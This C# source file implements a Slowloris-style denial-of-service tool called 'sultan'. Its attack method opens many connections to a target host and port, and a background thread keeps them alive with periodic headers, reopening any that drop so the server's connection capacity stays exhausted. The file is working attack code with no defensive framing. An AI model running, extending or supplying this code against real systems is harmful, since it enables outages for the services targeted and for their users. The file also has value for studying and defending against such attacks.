using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace sultan
{
    public class sllib
    {
        private readonly List<LorisConnection> connections;
        private readonly int timeout;

        public sllib(int waittime)
        {
            connections = new List<LorisConnection>();
            timeout = waittime;
            new Thread(() => keepAliveThread()).Start();
        }

        public void attack(string ip, int port, bool useSsl, int count)
        {
            Console.WriteLine("[sultan->slllib] VERB Host -> " + ip);
            Console.WriteLine("[sultan->slllib] VERB Port -> " + port.ToString());
            Console.WriteLine("[sultan->slllib] VERB Using SSL -> " + useSsl.ToString());
            Console.WriteLine("[sultan->slllib] VERB Count -> " + count.ToString());
            Console.WriteLine("[sultan->slllib] VERB initializing connections for {0} sockets", count);
            for (int i = 0; i < count; i++)
            {
                var conn = new LorisConnection(ip, port, useSsl);
                conn.SendHeaders("Sultan/0.3.0 (SLLLIB 2.0) LPTSTR/20100101 Airfox/0.36 ME_ELEMENTSYS The Legion of the Desperate Programmers");
                connections.Add(conn);
            }
        }

        private void keepAliveThread()
        {
            while (true)
            {
                Console.WriteLine("[sultan->slllib] VERB send keep-alive headers for {0} connections", connections.Count);
                for (int i = 0; i < connections.Count; i++)
                {
                    try
                    {
                        connections[i].KeepAlive();
                    }
                    catch
                    {
                        connections[i] = new LorisConnection(connections[i].IP, connections[i].Port, connections[i].UsingSsl);
                    }
                }
                Thread.Sleep(timeout);
            }
        }
    }
}

